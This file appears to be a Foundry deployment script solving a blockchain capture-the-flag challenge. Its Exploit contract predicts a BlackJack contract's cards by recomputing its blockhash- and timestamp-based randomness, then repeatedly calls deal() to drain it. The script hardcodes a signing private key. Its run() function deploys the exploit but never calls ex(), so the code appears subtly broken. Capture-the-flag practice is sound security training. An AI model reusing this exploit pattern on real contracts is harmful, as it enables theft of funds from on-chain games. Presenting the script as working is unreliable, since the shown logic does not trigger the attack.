// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-ctf/CTFDeployment.sol";
import "../src/Challenge.sol";

contract Deploy is Script {
    Challenge public chall = Challenge(address(0x88771cd55f734abB991FB3318133039e8fD8a3Cb));

    function run() external {
        vm.startBroadcast(0x9d2ff89a8ec169de5ddaddd2359be9415bd30556b7eb9dc0a280ee539cb02a4c);
        Exploit exploit = new Exploit{value: 20 ether}();
        if (!chall.isSolved()) {
            revert();
        }
        vm.stopBroadcast();
    }
}

interface BlackJack {
    function hit() external;
    function deal() external payable;
    function stand() external;
}

contract Exploit {
    Challenge public chall = Challenge(address(0xd1C097Af6d5Ce9f97beB81F973d49Cca2592Be3e));
    BlackJack public target;
    uint8 public seed1;
    uint8 public seed2;

    constructor() payable {
        target = BlackJack(address(chall.BLACKJACK()));
    }

    function ex() external payable {
        seed1 = uint8(
            uint256(keccak256(abi.encodePacked(blockhash(block.number), address(this), uint8(0), block.timestamp))) % 52
        );
        seed2 = uint8(
            uint256(keccak256(abi.encodePacked(blockhash(block.number), address(this), uint8(2), block.timestamp))) % 52
        );

        uint8[] memory _cards = new uint8[](2);
        _cards[0] = seed1;
        _cards[1] = seed2;

        (uint8 score, uint8 scoreBig) = calculateScore(_cards);

        if (scoreBig == 21) {
            payable(address(target)).transfer(10 ether);
            for (uint256 i = 0; i < 12; i++) {
                if (!chall.isSolved()) {
                    target.deal{value: 5 ether}();
                } else {
                    break;
                }
            }
        }
        payable(msg.sender).transfer(address(this).balance);
    }

    function valueOf(uint8 card, bool isBigAce) public returns (uint8) {
        uint8 value = card / 4;
        if (value == 0 || value == 11 || value == 12) {
            // Face cards
            return 10;
        }
        if (value == 1 && isBigAce) {
            // Ace is worth 11
            return 11;
        }
        return value;
    }

    function isAce(uint8 card) public returns (bool) {
        return card / 4 == 1;
    }

    function isTen(uint8 card) public returns (bool) {
        return card / 4 == 10;
    }

    function calculateScore(uint8[] memory cards) public returns (uint8, uint8) {
        uint8 score = 0;
        uint8 scoreBig = 0; // in case of Ace there could be 2 different scores
        bool bigAceUsed = false;
        for (uint256 i = 0; i < cards.length; ++i) {
            uint8 card = cards[i];
            if (isAce(card) && !bigAceUsed) {
                // doesn't make sense to use the second Ace as 11, because it leads to the losing
                scoreBig += valueOf(card, true);
                bigAceUsed = true;
            } else {
                scoreBig += valueOf(card, false);
            }
            score += valueOf(card, false);
        }
        return (score, scoreBig);
    }

    receive() external payable {}
}
